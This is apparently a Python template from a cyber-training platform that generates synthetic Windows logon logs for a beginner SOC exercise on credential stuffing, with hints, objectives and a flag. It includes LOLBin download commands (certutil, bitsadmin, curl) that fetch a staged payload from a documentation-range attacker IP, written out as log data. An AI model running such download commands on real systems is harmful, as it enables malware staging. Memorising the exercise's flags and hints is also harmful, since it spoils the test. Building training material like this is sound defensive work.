"""Human-crafted SOC Authentication Triage Template."""
from pathlib import Path
from typing import Dict, Any, List, Optional
import datetime
import hashlib
import json
import random
import shutil

from cyberlab.services.generator.template_base import BaseChallengeTemplate


class SocAuthTemplate(BaseChallengeTemplate):
    """
    Template for Off-Hours Authentication Triage & Credential Stuffing Analysis.
    Generates synthetic Windows event telemetry (Events 4624, 4625, 4688) with
    dynamic attacker IPs, compromised usernames, timestamps, and flags.
    """

    template_id = "soc-auth-investigation"
    title = "SOC Incident: Authentication Triage & Credential Stuffing"
    category = "SOC Investigation"
    difficulty = "Beginner"
    base_points = 100
    duration_minutes = 45
    competency_id = "soc_investigation"
    competency_weight = 1.0

    CODENAMES = [
        "Operation NightShift",
        "Operation IronRaven",
        "Operation ShadowGate",
        "Operation DarkCascade",
        "Operation FrostBite",
        "Operation CyberVault",
    ]

    TARGET_ACCOUNTS = [
        "admin_finance",
        "svc_backup",
        "fin_director",
        "secops_lead",
        "payroll_admin",
        "corp_executive",
    ]

    TARGET_HOSTS = [
        ("PAYROLL-SRV01", "10.0.4.50"),
        ("FINANCE-DC01", "10.0.4.10"),
        ("CORP-VAULT02", "10.0.4.99"),
        ("HR-ERP-SRV", "10.0.4.75"),
    ]

    LOLBIN_TOOLS = [
        ("certutil.exe", "-urlcache -split -f"),
        ("bitsadmin.exe", "/transfer job /download /priority high"),
        ("curl.exe", "-s -O"),
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "attacker_ip": {"type": "str", "description": "External brute-force IP address"},
            "victim_account": {"type": "str", "description": "Breached user/service account"},
            "target_host": {"type": "str", "description": "Target server hostname"},
            "target_ip": {"type": "str", "description": "Target server internal IP"},
            "lolbin_tool": {"type": "str", "description": "Living-off-the-land executable"},
            "lolbin_args": {"type": "str", "description": "Staging argument flags"},
            "staged_binary": {"type": "str", "description": "Downloaded malicious payload"},
            "flag_nonce": {"type": "str", "description": "Randomized token for anti-cheat flag"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rnd = random.Random(seed)
        host_name, host_ip = rnd.choice(self.TARGET_HOSTS)
        lolbin_cmd, lolbin_args = rnd.choice(self.LOLBIN_TOOLS)
        victim = rnd.choice(self.TARGET_ACCOUNTS)

        # Generate realistic external attacker IP (TEST-NET-2 / RFC 5737)
        attacker_ip = f"198.51.100.{rnd.randint(10, 240)}"
        seed_hash = hashlib.sha256((seed or str(rnd.random())).encode()).hexdigest()[:8]

        slots = {
            "incident_codename": rnd.choice(self.CODENAMES),
            "attacker_ip": attacker_ip,
            "victim_account": victim,
            "target_host": host_name,
            "target_ip": host_ip,
            "lolbin_tool": lolbin_cmd,
            "lolbin_args": lolbin_args,
            "staged_binary": rnd.choice(["pivot.exe", "beacon.bin", "stager.dll", "agent.exe"]),
            "flag_nonce": seed_hash,
            "seed_hash": seed_hash,
            "brute_force_attempts": rnd.randint(220, 290),
        }

        if overrides:
            slots.update(overrides)

        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        victim = slots.get("victim_account", "admin")
        nonce = slots.get("flag_nonce", "2026")
        return f"FLAG{{brute_force_pivot_{victim}_{nonce}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Group authentication events by source_ip and status=='FAILURE' to find the anomalous external IP generating hundreds of failed attempts.",
                "penalty": 15,
            },
            {
                "id": 2,
                "content": f"Once you isolate the attacker IP, look for the very first 'SUCCESS' logon event from that IP. Notice which account was breached.",
                "penalty": 25,
            },
            {
                "id": 3,
                "content": f"Inspect post-logon command execution in the telemetry. Look for execution of {slots.get('lolbin_tool', 'certutil.exe')}; the containment flag is embedded in its parameters.",
                "penalty": 35,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            f"Identify the external attacker IP address conducting brute force attacks against {slots.get('target_host')}.",
            f"Discover the targeted account compromised during off-hours.",
            f"Inspect the post-authentication administrative commands to uncover the incident flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return (
            f"### Scenario: {slots.get('incident_codename')}\n\n"
            f"At 03:14 UTC, SIEM triggered a high-severity alert for abnormal authentication failures targeting "
            f"`{slots.get('target_host')}` (`{slots.get('target_ip')}`), followed by privileged logon activity.\n\n"
            f"Your mission as Tier-1/2 SOC Analyst is to scope the campaign, identify the compromised account, "
            f"trace attacker post-exploitation commands, and retrieve the containment flag."
        )

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        rnd = random.Random(slots.get("seed_hash", "default"))
        base_time = datetime.datetime(2026, 9, 10, 1, 0, 0)
        events = []

        legit_users = ["alice", "bob", "elena", "frank", "david", "svc_sql", "svc_backup"]
        workstation = slots.get("target_host", "PAYROLL-SRV01")
        attacker_ip = slots.get("attacker_ip", "198.51.100.42")
        victim_user = slots.get("victim_account", "admin_finance")
        flag = self.compute_flag(slots)

        # 1. Background legitimate activity (~750 events)
        for i in range(750):
            t = base_time + datetime.timedelta(seconds=i * 12 + rnd.randint(0, 5))
            u = rnd.choice(legit_users)
            ip = f"10.0.1.{rnd.randint(10, 60)}"
            events.append({
                "timestamp": t.strftime("%Y-%m-%d %H:%M:%S+00:00"),
                "event_id": 4624,
                "source_ip": ip,
                "target_user": u,
                "workstation": workstation,
                "status": "SUCCESS",
                "auth_package": "Kerberos",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
            })

        # 2. Brute force password spray attempts from attacker IP
        brute_count = slots.get("brute_force_attempts", 250)
        spray_start = base_time + datetime.timedelta(hours=2, minutes=10)
        for i in range(brute_count):
            t = spray_start + datetime.timedelta(seconds=i * 2 + rnd.randint(0, 1))
            events.append({
                "timestamp": t.strftime("%Y-%m-%d %H:%M:%S+00:00"),
                "event_id": 4625,
                "source_ip": attacker_ip,
                "target_user": victim_user if i > (brute_count - 30) else rnd.choice(legit_users + [victim_user]),
                "workstation": workstation,
                "status": "FAILURE",
                "auth_package": "NTLM",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
            })

        # 3. Successful breach logon
        breach_time = spray_start + datetime.timedelta(seconds=brute_count * 2 + 5)
        events.append({
            "timestamp": breach_time.strftime("%Y-%m-%d %H:%M:%S+00:00"),
            "event_id": 4624,
            "source_ip": attacker_ip,
            "target_user": victim_user,
            "workstation": workstation,
            "status": "SUCCESS",
            "auth_package": "NTLM",
            "process_name": "C:\\Windows\\System32\\lsass.exe",
        })

        # 4. Living-off-the-Land post-exploitation command containing flag
        cmd_time = breach_time + datetime.timedelta(seconds=18)
        lolbin = slots.get("lolbin_tool", "certutil.exe")
        args = slots.get("lolbin_args", "-urlcache -split -f")
        staged = slots.get("staged_binary", "pivot.exe")
        command_line = f"{lolbin} {args} http://{attacker_ip}/{staged} {flag}"

        events.append({
            "timestamp": cmd_time.strftime("%Y-%m-%d %H:%M:%S+00:00"),
            "event_id": 4688,
            "source_ip": attacker_ip,
            "target_user": victim_user,
            "workstation": workstation,
            "status": "SUCCESS",
            "auth_package": "COMMAND",
            "process_name": f"C:\\Windows\\System32\\{lolbin}",
            "command_line": command_line,
        })

        # Sort chronologically
        events.sort(key=lambda x: x["timestamp"])

        data_file = data_dir / "auth_events.json"
        with open(data_file, "w") as f:
            json.dump(events, f, indent=2)

        return {"auth_events.json": data_file}

    def generate_notebook(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Path:
        """
        Copy and parameterize the SOC Marimo notebook with the dynamically computed
        target flag hash and host details.
        """
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        from cyberlab.core.config import settings
        src_nb = settings.CHALLENGES_DIR / "01-soc-auth-investigation" / "marimo" / "challenge.py"
        code = src_nb.read_text(encoding="utf-8")

        # Replace target hash with dynamically computed hash for this student/session
        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        # Replace old hardcoded target hash
        code = code.replace(
            'target_hash = "3422238b011b622ac8dfe184eef91461c0dd7728771aa7e343915790c26e87a8"',
            f'target_hash = "{dynamic_hash}"'
        )

        target_nb.write_text(code, encoding="utf-8")
        return target_nb
